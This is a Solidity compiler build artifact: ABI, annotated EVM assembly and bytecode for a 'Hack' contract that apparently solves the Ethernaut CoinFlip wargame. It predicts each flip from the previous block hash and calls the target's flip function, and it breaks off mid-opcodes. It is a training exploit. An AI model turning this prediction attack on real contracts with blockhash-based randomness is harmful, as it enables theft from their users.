{
	"security/etheranut/CoinFlip/CoinFlip.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "consecutiveWins",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"security/etheranut/CoinFlip/CoinFlip.sol\":830:1617  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"security/etheranut/CoinFlip/CoinFlip.sol\":869:911  0x13d9309A33b0841f153aCf1454021531D28f1ef6 */\n  0x13d9309a33b0841f153acf1454021531d28f1ef6\n    /* \"security/etheranut/CoinFlip/CoinFlip.sol\":851:911  address  target = 0x13d9309A33b0841f153aCf1454021531D28f1ef6 */\n  0x00\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/CoinFlip/CoinFlip.sol\":941:947  target */\n  0x00\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"security/etheranut/CoinFlip/CoinFlip.sol\":918:948  CoinFlip cf = CoinFlip(target) */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/CoinFlip/CoinFlip.sol\":995:1072  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"security/etheranut/CoinFlip/CoinFlip.sol\":978:1072  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x03\n  sstore\n    /* \"security/etheranut/CoinFlip/CoinFlip.sol\":830:1617  contract Hack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":830:1617  contract Hack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_2\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_3\n      jumpi\n    tag_1:\n      revert(0x00, 0x00)\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1435:1503  function attack() public payable {... */\n    tag_2:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1511:1612  function consecutiveWins() public view returns(uint256){... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_6\n      jumpi\n      revert(0x00, 0x00)\n    tag_6:\n      pop\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1435:1503  function attack() public payable {... */\n    tag_5:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1479:1481  cf */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1479:1486  cf.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1487:1494  guess() */\n      tag_12\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1487:1492  guess */\n      tag_13\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1487:1494  guess() */\n      jump\t// in\n    tag_12:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1479:1495  cf.flip(guess()) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      pop\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1435:1503  function attack() public payable {... */\n      jump\t// out\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1511:1612  function consecutiveWins() public view returns(uint256){... */\n    tag_8:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1558:1565  uint256 */\n      0x00\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1584:1586  cf */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1584:1602  cf.consecutiveWins */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe6f334d7\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1584:1604  cf.consecutiveWins() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1577:1604  return cf.consecutiveWins() */\n      swap1\n      pop\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1511:1612  function consecutiveWins() public view returns(uint256){... */\n      swap1\n      jump\t// out\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1081:1427  function guess() private returns(bool) {... */\n    tag_13:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1114:1118  bool */\n      0x00\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1131:1149  uint256 blockValue */\n      0x00\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1185:1186  1 */\n      0x01\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1170:1182  block.number */\n      number\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1170:1186  block.number - 1 */\n      tag_26\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1160:1187  blockhash(block.number - 1) */\n      blockhash\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1152:1188  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1131:1188  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1217:1227  blockValue */\n      dup1\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1205:1213  lastHash */\n      sload(0x02)\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1205:1227  lastHash == blockValue */\n      sub\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1201:1264  if (lastHash == blockValue) {... */\n      tag_28\n      jumpi\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1244:1252  revert() */\n      revert(0x00, 0x00)\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1201:1264  if (lastHash == blockValue) {... */\n    tag_28:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1287:1297  blockValue */\n      dup1\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1276:1284  lastHash */\n      0x02\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1276:1297  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1308:1324  uint256 coinFlip */\n      0x00\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1340:1346  FACTOR */\n      sload(0x03)\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1327:1337  blockValue */\n      dup3\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1327:1346  blockValue / FACTOR */\n      tag_29\n      swap2\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1308:1346  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1357:1366  bool side */\n      0x00\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1381:1382  1 */\n      0x01\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1369:1377  coinFlip */\n      dup3\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1369:1382  coinFlip == 1 */\n      eq\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1369:1397  coinFlip == 1 ? true : false */\n      tag_31\n      jumpi\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1392:1397  false */\n      0x00\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1369:1397  coinFlip == 1 ? true : false */\n      jump(tag_32)\n    tag_31:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1385:1389  true */\n      0x01\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1369:1397  coinFlip == 1 ? true : false */\n    tag_32:\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1357:1397  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1415:1419  side */\n      dup1\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1408:1419  return side */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/CoinFlip/CoinFlip.sol\":1081:1427  function guess() private returns(bool) {... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_33:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_34:\n        /* \"#utility.yul\":177:201   */\n      tag_49\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_33\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_10:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_51\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_34\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:532   */\n    tag_35:\n        /* \"#utility.yul\":476:483   */\n      0x00\n        /* \"#utility.yul\":519:524   */\n      dup2\n        /* \"#utility.yul\":512:525   */\n      iszero\n        /* \"#utility.yul\":505:526   */\n      iszero\n        /* \"#utility.yul\":494:526   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:532   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":538:647   */\n    tag_36:\n        /* \"#utility.yul\":619:640   */\n      tag_54\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":619:640   */\n      tag_35\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":614:617   */\n      dup3\n        /* \"#utility.yul\":607:641   */\n      mstore\n        /* \"#utility.yul\":538:647   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":653:863   */\n    tag_15:\n        /* \"#utility.yul\":740:744   */\n      0x00\n        /* \"#utility.yul\":778:780   */\n      0x20\n        /* \"#utility.yul\":767:776   */\n      dup3\n        /* \"#utility.yul\":763:781   */\n      add\n        /* \"#utility.yul\":755:781   */\n      swap1\n      pop\n        /* \"#utility.yul\":791:856   */\n      tag_56\n        /* \"#utility.yul\":853:854   */\n      0x00\n        /* \"#utility.yul\":842:851   */\n      dup4\n        /* \"#utility.yul\":838:855   */\n      add\n        /* \"#utility.yul\":829:835   */\n      dup5\n        /* \"#utility.yul\":791:856   */\n      tag_36\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":653:863   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":950:1067   */\n    tag_38:\n        /* \"#utility.yul\":1059:1060   */\n      0x00\n        /* \"#utility.yul\":1056:1057   */\n      0x00\n        /* \"#utility.yul\":1049:1061   */\n      revert\n        /* \"#utility.yul\":1196:1312   */\n    tag_40:\n        /* \"#utility.yul\":1266:1287   */\n      tag_61\n        /* \"#utility.yul\":1281:1286   */\n      dup2\n        /* \"#utility.yul\":1266:1287   */\n      tag_35\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1259:1264   */\n      dup2\n        /* \"#utility.yul\":1256:1288   */\n      eq\n        /* \"#utility.yul\":1246:1306   */\n      tag_62\n      jumpi\n        /* \"#utility.yul\":1302:1303   */\n      0x00\n        /* \"#utility.yul\":1299:1300   */\n      0x00\n        /* \"#utility.yul\":1292:1304   */\n      revert\n        /* \"#utility.yul\":1246:1306   */\n    tag_62:\n        /* \"#utility.yul\":1196:1312   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1318:1455   */\n    tag_41:\n        /* \"#utility.yul\":1372:1377   */\n      0x00\n        /* \"#utility.yul\":1403:1409   */\n      dup2\n        /* \"#utility.yul\":1397:1410   */\n      mload\n        /* \"#utility.yul\":1388:1410   */\n      swap1\n      pop\n        /* \"#utility.yul\":1419:1449   */\n      tag_64\n        /* \"#utility.yul\":1443:1448   */\n      dup2\n        /* \"#utility.yul\":1419:1449   */\n      tag_40\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1318:1455   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1461:1806   */\n    tag_19:\n        /* \"#utility.yul\":1528:1534   */\n      0x00\n        /* \"#utility.yul\":1577:1579   */\n      0x20\n        /* \"#utility.yul\":1565:1574   */\n      dup3\n        /* \"#utility.yul\":1556:1563   */\n      dup5\n        /* \"#utility.yul\":1552:1575   */\n      sub\n        /* \"#utility.yul\":1548:1580   */\n      slt\n        /* \"#utility.yul\":1545:1664   */\n      iszero\n      tag_66\n      jumpi\n        /* \"#utility.yul\":1583:1662   */\n      tag_67\n      tag_38\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1545:1664   */\n    tag_66:\n        /* \"#utility.yul\":1703:1704   */\n      0x00\n        /* \"#utility.yul\":1728:1789   */\n      tag_68\n        /* \"#utility.yul\":1781:1788   */\n      dup5\n        /* \"#utility.yul\":1772:1778   */\n      dup3\n        /* \"#utility.yul\":1761:1770   */\n      dup6\n        /* \"#utility.yul\":1757:1779   */\n      add\n        /* \"#utility.yul\":1728:1789   */\n      tag_41\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1718:1789   */\n      swap2\n      pop\n        /* \"#utility.yul\":1674:1799   */\n      pop\n        /* \"#utility.yul\":1461:1806   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1812:1934   */\n    tag_42:\n        /* \"#utility.yul\":1885:1909   */\n      tag_70\n        /* \"#utility.yul\":1903:1908   */\n      dup2\n        /* \"#utility.yul\":1885:1909   */\n      tag_33\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1878:1883   */\n      dup2\n        /* \"#utility.yul\":1875:1910   */\n      eq\n        /* \"#utility.yul\":1865:1928   */\n      tag_71\n      jumpi\n        /* \"#utility.yul\":1924:1925   */\n      0x00\n        /* \"#utility.yul\":1921:1922   */\n      0x00\n        /* \"#utility.yul\":1914:1926   */\n      revert\n        /* \"#utility.yul\":1865:1928   */\n    tag_71:\n        /* \"#utility.yul\":1812:1934   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1940:2083   */\n    tag_43:\n        /* \"#utility.yul\":1997:2002   */\n      0x00\n        /* \"#utility.yul\":2028:2034   */\n      dup2\n        /* \"#utility.yul\":2022:2035   */\n      mload\n        /* \"#utility.yul\":2013:2035   */\n      swap1\n      pop\n        /* \"#utility.yul\":2044:2077   */\n      tag_73\n        /* \"#utility.yul\":2071:2076   */\n      dup2\n        /* \"#utility.yul\":2044:2077   */\n      tag_42\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":1940:2083   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2089:2440   */\n    tag_24:\n        /* \"#utility.yul\":2159:2165   */\n      0x00\n        /* \"#utility.yul\":2208:2210   */\n      0x20\n        /* \"#utility.yul\":2196:2205   */\n      dup3\n        /* \"#utility.yul\":2187:2194   */\n      dup5\n        /* \"#utility.yul\":2183:2206   */\n      sub\n        /* \"#utility.yul\":2179:2211   */\n      slt\n        /* \"#utility.yul\":2176:2295   */\n      iszero\n      tag_75\n      jumpi\n        /* \"#utility.yul\":2214:2293   */\n      tag_76\n      tag_38\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2176:2295   */\n    tag_75:\n        /* \"#utility.yul\":2334:2335   */\n      0x00\n        /* \"#utility.yul\":2359:2423   */\n      tag_77\n        /* \"#utility.yul\":2415:2422   */\n      dup5\n        /* \"#utility.yul\":2406:2412   */\n      dup3\n        /* \"#utility.yul\":2395:2404   */\n      dup6\n        /* \"#utility.yul\":2391:2413   */\n      add\n        /* \"#utility.yul\":2359:2423   */\n      tag_43\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2349:2423   */\n      swap2\n      pop\n        /* \"#utility.yul\":2305:2433   */\n      pop\n        /* \"#utility.yul\":2089:2440   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2446:2626   */\n    tag_44:\n        /* \"#utility.yul\":2494:2571   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2491:2492   */\n      0x00\n        /* \"#utility.yul\":2484:2572   */\n      mstore\n        /* \"#utility.yul\":2591:2595   */\n      0x11\n        /* \"#utility.yul\":2588:2589   */\n      0x04\n        /* \"#utility.yul\":2581:2596   */\n      mstore\n        /* \"#utility.yul\":2615:2619   */\n      0x24\n        /* \"#utility.yul\":2612:2613   */\n      0x00\n        /* \"#utility.yul\":2605:2620   */\n      revert\n        /* \"#utility.yul\":2632:2826   */\n    tag_27:\n        /* \"#utility.yul\":2672:2676   */\n      0x00\n        /* \"#utility.yul\":2692:2712   */\n      tag_80\n        /* \"#utility.yul\":2710:2711   */\n      dup3\n        /* \"#utility.yul\":2692:2712   */\n      tag_33\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2687:2712   */\n      swap2\n      pop\n        /* \"#utility.yul\":2726:2746   */\n      tag_81\n        /* \"#utility.yul\":2744:2745   */\n      dup4\n        /* \"#utility.yul\":2726:2746   */\n      tag_33\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":2721:2746   */\n      swap3\n      pop\n        /* \"#utility.yul\":2770:2771   */\n      dup3\n        /* \"#utility.yul\":2767:2768   */\n      dup3\n        /* \"#utility.yul\":2763:2772   */\n      sub\n        /* \"#utility.yul\":2755:2772   */\n      swap1\n      pop\n        /* \"#utility.yul\":2794:2795   */\n      dup2\n        /* \"#utility.yul\":2788:2792   */\n      dup2\n        /* \"#utility.yul\":2785:2796   */\n      gt\n        /* \"#utility.yul\":2782:2819   */\n      iszero\n      tag_82\n      jumpi\n        /* \"#utility.yul\":2799:2817   */\n      tag_83\n      tag_44\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":2782:2819   */\n    tag_82:\n        /* \"#utility.yul\":2632:2826   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2832:3012   */\n    tag_45:\n        /* \"#utility.yul\":2880:2957   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2877:2878   */\n      0x00\n        /* \"#utility.yul\":2870:2958   */\n      mstore\n        /* \"#utility.yul\":2977:2981   */\n      0x12\n        /* \"#utility.yul\":2974:2975   */\n      0x04\n        /* \"#utility.yul\":2967:2982   */\n      mstore\n        /* \"#utility.yul\":3001:3005   */\n      0x24\n        /* \"#utility.yul\":2998:2999   */\n      0x00\n        /* \"#utility.yul\":2991:3006   */\n      revert\n        /* \"#utility.yul\":3018:3203   */\n    tag_30:\n        /* \"#utility.yul\":3058:3059   */\n      0x00\n        /* \"#utility.yul\":3075:3095   */\n      tag_86\n        /* \"#utility.yul\":3093:3094   */\n      dup3\n        /* \"#utility.yul\":3075:3095   */\n      tag_33\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":3070:3095   */\n      swap2\n      pop\n        /* \"#utility.yul\":3109:3129   */\n      tag_87\n        /* \"#utility.yul\":3127:3128   */\n      dup4\n        /* \"#utility.yul\":3109:3129   */\n      tag_33\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":3104:3129   */\n      swap3\n      pop\n        /* \"#utility.yul\":3148:3149   */\n      dup3\n        /* \"#utility.yul\":3138:3173   */\n      tag_88\n      jumpi\n        /* \"#utility.yul\":3153:3171   */\n      tag_89\n      tag_45\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":3138:3173   */\n    tag_88:\n        /* \"#utility.yul\":3195:3196   */\n      dup3\n        /* \"#utility.yul\":3192:3193   */\n      dup3\n        /* \"#utility.yul\":3188:3197   */\n      div\n        /* \"#utility.yul\":3183:3197   */\n      swap1\n      pop\n        /* \"#utility.yul\":3018:3203   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220dc8ff39a136e2b96c747e0f0632ca52d7e95b18c219f31df8ca5abd95936033d64736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040527313d9309a33b0841f153acf1454021531d28f1ef65f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f800000000000000000000000000000000000000000000000000000000000000060035534801560e5575f5ffd5b506103f3806100f35f395ff3fe608060405260043610610028575f3560e01c80639e5faafc1461002c578063e6f334d714610036575b5f5ffd5b610034610060565b005b348015610041575f5ffd5b5061004a610104565b6040516100579190610206565b60405180910390f35b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f676100a5610198565b6040518263ffffffff1660e01b81526004016100c19190610239565b6020604051808303815f875af11580156100dd573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101019190610280565b50565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e6f334d76040518163ffffffff1660e01b8152600401602060405180830381865afa15801561016f573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061019391906102d5565b905090565b5f5f6001436101a7919061032d565b405f1c905080600254036101b9575f5ffd5b806002819055505f600354826101cf919061038d565b90505f600182146101e0575f6101e3565b60015b905080935050505090565b5f819050919050565b610200816101ee565b82525050565b5f6020820190506102195f8301846101f7565b92915050565b5f8115159050919050565b6102338161021f565b82525050565b5f60208201905061024c5f83018461022a565b92915050565b5f5ffd5b61025f8161021f565b8114610269575f5ffd5b50565b5f8151905061027a81610256565b92915050565b5f6020828403121561029557610294610252565b5b5f6102a28482850161026c565b91505092915050565b6102b4816101ee565b81146102be575f5ffd5b50565b5f815190506102cf816102ab565b92915050565b5f602082840312156102ea576102e9610252565b5b5f6102f7848285016102c1565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610337826101ee565b9150610342836101ee565b925082820390508181111561035a57610359610300565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610397826101ee565b91506103a2836101ee565b9250826103b2576103b1610360565b5b82820490509291505056fea2646970667358221220dc8ff39a136e2b96c747e0f0632ca52d7e95b18c219f31df8ca5abd95936033d64736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x13D9309A33B0841F153ACF1454021531D28F1EF6 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x3 SSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE5 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x3F3 DUP1 PUSH2 0xF3 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x28 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x2C JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x36 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x34 PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x41 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x4A PUSH2 0x104 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x57 SWAP2 SWAP1 PUSH2 0x206 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH2 0xA5 PUSH2 0x198 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC1 SWAP2 SWAP1 PUSH2 0x239 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xDD JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 